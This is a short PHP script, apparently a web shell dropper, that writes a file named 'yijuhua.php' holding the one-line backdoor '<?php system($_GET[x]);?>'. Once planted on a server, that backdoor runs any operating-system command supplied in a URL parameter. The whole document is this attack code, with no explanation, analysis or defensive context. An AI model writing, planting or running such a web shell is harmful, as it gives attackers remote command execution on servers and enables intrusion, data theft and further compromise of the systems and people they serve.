<?php
$myfile = fopen("yijuhua.php","w");
$txt = '<?php system($_GET[x]);?>';
fwrite($myfile,$txt);
fclose($myfile);
?>
